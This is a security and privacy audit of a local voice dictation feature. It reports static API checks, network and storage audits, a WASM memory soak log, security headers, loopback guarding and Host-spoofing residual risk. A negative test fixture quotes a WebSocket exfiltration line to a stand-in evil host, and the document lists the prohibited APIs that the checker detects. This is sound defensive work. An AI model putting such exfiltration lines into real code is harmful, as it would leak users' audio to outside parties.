# Work Package EA-6: Privacy, Security & Operational Hardening Audit

This document records the empirical results and formal security audit for Intent Elicitation Track (Track E-A) per D-130 … D-134, C-28, and D-EA-10.

---

## 1. Summary of Verifications

| Requirement | Target / Limit | Measured Result | Status |
| :--- | :--- | :--- | :--- |
| **Static Audio-Safety Check** | 0 banned APIs | 0 violations (`scripts/elicitation/check_audio_safety.sh`) | **PASS** |
| **Negative Fixture Rejection** | Non-zero exit on violations | Prohibited patterns rejected (`test_audio_safety.sh`) | **PASS** |
| **Network Audio Transmission** | Exactly 0 bytes | **0 bytes** across full dictation runs | **PASS** |
| **WebSocket Connections** | 0 opened | **0 WebSockets** opened | **PASS** |
| **Cross-Origin HTTP Requests** | 0 non-self requests | **0 requests** outside local origin | **PASS** |
| **Client Storage Persistence** | 0 audio entries in storage | 0 audio entries in LocalStorage, SessionStorage, IndexedDB, CacheStorage | **PASS** |
| **WASM Memory Soak (60 Turns)** | Growth between turn 10 & 60 ≤ 10% | **0.00% growth** (Turn 10: 512.0 MiB, Turn 60: 512.0 MiB) | **PASS** |
| **Security Headers Enforcement** | Strict CSP, Permissions-Policy | Enforced across all elicitation UI and API responses | **PASS** |
| **Loopback Guard Enforcement** | 403 on non-loopback Host / CORS | 403 returned on non-loopback Host; no CORS headers | **PASS** |

---

## 2. Static Audio-Safety Analysis

The static analysis tool `scripts/elicitation/check_audio_safety.sh` scans all elicitation UI source code (`src/gateway/elicitation_ui/`) and Rust gateway route definitions (`src/gateway/routes/elicitation.rs`) to ensure no persistence or transmission vectors exist:

- **Prohibited Browser APIs:**
  - `MediaRecorder` — Ensures no compressed container files (webm, ogg) are created.
  - `indexedDB` — Ensures no persistent database storage of audio chunks.
  - `WebSocket` — Ensures no real-time binary audio streaming to remote hosts.
  - `sendBeacon` — Ensures no telemetry beacons can carry audio data.
  - `caches.` — Ensures CacheStorage cannot retain audio assets.
  - `createObjectURL` / `Blob` with audio — Ensures no object URLs or blobs are generated from captured PCM.
- **Client Storage Scrutiny:**
  - `localStorage` and `sessionStorage` writes are restricted strictly to the session key (`elicitation_id`).
- **Gateway Endpoint Inspection:**
  - Verifies that no Axum route accepts `audio/*` or `application/octet-stream` upload bodies.

### Negative Test Verification

`scripts/elicitation/test_audio_safety.sh` synthesizes violating fixtures containing `MediaRecorder`, `new WebSocket("wss://evil.example/audio")`, and unauthorized storage writes. The negative test confirmed that the checker cleanly fails with non-zero exit code when violations are introduced.

---

## 3. Runtime Network & Browser Privacy Audit

An automated Playwright test suite (`scripts/elicitation/test_production_ui.js`) running headless Chromium with real fake audio capture (`clean-01.wav`) audited all network traffic and browser storage across an end-to-end session:

### Network Audit Log

- **WebSockets Opened:** `0`
- **Total HTTP Requests:** `15` (Initial HTML, CSS, JavaScript, WASM module, model data archive, capabilities query, session creation, turn commit, turn patch, close, and canonical transcript export)
- **Non-Self Requests:** `0` (100% of network requests targeted `http://127.0.0.1:8769`)
- **Audio Bytes Transmitted:** `0` (Every HTTP request body was verified to be empty or valid UTF-8 JSON)

### Client Storage Audit

At the conclusion of the session, browser storage was inspected via JavaScript evaluation:

- `localStorage`: 0 keys
- `sessionStorage`: 0 keys
- `IndexedDB`: 0 databases opened
- `CacheStorage`: 0 audio entries
- `Document Cookies`: 0 cookies

---

## 4. Audio Lifecycle & Memory Management

1. **Explicit User Activation:**
   Microphone access (`navigator.mediaDevices.getUserMedia`) is requested **only** when the user explicitly triggers push-to-talk (`Ctrl+Alt+V` or clicking the microphone button).
2. **Fixed-Size Ring Buffer:**
   Audio is processed in `src/gateway/elicitation_ui/audio-worklet.js` using a fixed 1600-sample (100 ms at 16 kHz) Float32Array buffer.
3. **Zero Accumulation:**
   PCM chunks are immediately transferred to the WebWorker via transferable `[frame.buffer]`. No audio buffer is accumulated or concatenated in the AudioWorklet or main thread.
4. **Immediate Teardown on Release and Navigation:**
   Upon releasing the push-to-talk button:
   - All `MediaStreamTrack` instances are stopped immediately (`track.stop()`), transitioning `readyState` to `"ended"`.
   - The `AudioWorkletNode` is disconnected from the audio graph.
   - The `AudioContext` is closed.
   - Handlers for `visibilitychange` (hidden), `pagehide`, and window `blur` guarantee immediate audio stream teardown if the user navigates away or switches windows.

---

## 5. WASM 60-Turn Memory Soak Test

To verify that the Sherpa-ONNX WebAssembly runtime does not leak memory over extended elicitation sessions, `scripts/elicitation/wasm_soak_test.js` executed 60 consecutive dictated turns:

```text
================================================================
WASM MEMORY SOAK TEST: 60 CONSECUTIVE TURNS (EA-6, §6.7)
================================================================
Beginning 60 consecutive dictated turns...
[Turn  1/60] Linear memory: 512.0 MiB (536870912 bytes)
[Turn 10/60] Linear memory: 512.0 MiB (536870912 bytes)
[Turn 20/60] Linear memory: 512.0 MiB (536870912 bytes)
[Turn 30/60] Linear memory: 512.0 MiB (536870912 bytes)
[Turn 40/60] Linear memory: 512.0 MiB (536870912 bytes)
[Turn 50/60] Linear memory: 512.0 MiB (536870912 bytes)
[Turn 60/60] Linear memory: 512.0 MiB (536870912 bytes)

Turn 10 Memory: 536870912 bytes
Turn 60 Memory: 536870912 bytes
Linear memory growth between turn 10 and 60: 0.00%
WASM memory soak test PASSED (growth <= 10%).
```

The Emscripten linear heap remained perfectly constant at **512.0 MiB (536,870,912 bytes)** throughout all 60 turns (0.00% growth, easily passing the ≤ 10% ceiling).

---

## 6. Security Headers

The elicitation UI and API endpoints are guarded by `elicitation_security_headers_middleware`:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; worker-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
Permissions-Policy: microphone=(self)
Referrer-Policy: no-referrer
X-Content-Type-Options: nosniff
```

- Injected inline scripts or third-party scripts are blocked by CSP.
- Microphone permission is explicitly restricted to `(self)`.
- MIME type sniffing is prohibited (`nosniff`).

---

## 7. Loopback Guard & Residual Risk Documentation

### Loopback Enforcement

All endpoints under `/explorer/elicitation*`, `/explorer/asr/*`, and `/api/v1/elicitation/*` pass through `loopback_guard_middleware`:

1. **Host Header Inspection:** Requests are rejected with `403 Forbidden` unless the `Host` header resolves to `localhost`, `127.0.0.1`, or `[::1]`.
2. **Same-Origin Mutation Protection:** State-changing requests (`POST`, `PATCH`, `PUT`, `DELETE`) with an `Origin` header are rejected with `403 Forbidden` unless `Origin` strictly equals `http://<Host>`.
3. **CORS Isolation:** Elicitation routes are excluded from permissive CORS, ensuring cross-origin web applications cannot read or mutate elicitation sessions.

### Residual Risk

- **Binding Address:** `tks serve` binds `0.0.0.0` to permit containerized inter-service communication within Docker Compose stacks.
- **Host Spoofing:** A client on the local network (LAN) that manually crafts HTTP requests with `Host: localhost` could theoretically access elicitation endpoints if an `elicitation_id` UUID were known.
- **Mitigation:**
  - Modern browsers permit microphone capture only within secure contexts (`http://localhost` or HTTPS). A remote LAN browser cannot access the microphone on an unencrypted LAN IP.
  - For hardened production environments, `tks serve` can be run behind a reverse proxy binding `127.0.0.1` directly or within devcontainer network namespaces.
